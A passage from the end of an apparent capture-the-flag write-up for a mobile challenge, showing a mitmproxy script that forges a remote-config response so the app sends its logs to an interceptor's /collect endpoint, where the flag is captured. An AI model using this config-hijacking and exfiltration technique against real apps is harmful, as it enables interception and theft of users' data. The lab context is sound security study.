        if flow.request.path == "/remoteConfig" and flow.request.method.upper() == "GET":
            target = f"http://{flow.request.host}/collect"
            body = ('{"mode":"collect_logs","target_url":"%s"}' % target).encode()
            flow.response = http.Response.make(200, body, {"Content-Type": "application/json"})
            ctx.log.info(f"[RC] {body.decode()}")
            return

        # intercept POST /collect: log body and ACK
        if flow.request.path == "/collect" and flow.request.method.upper() == "POST":
            ctx.log.info(f"[FLAG] {flow.request.get_text()}")
            flow.response = http.Response.make(200, b"ok\n", {"Content-Type": "text/plain"})
            return
```

Run mitmproxy and just wait the request
```bash
mitmproxy -s mitmIntecerptor.py --listen-host 0.0.0.0 --listen-port 8080
```

![[8ksec-backSync3.png]]

Look into `/collect` POST and there are the flag!
![[8ksec-backSync4.png]]

I hope you found it useful (:
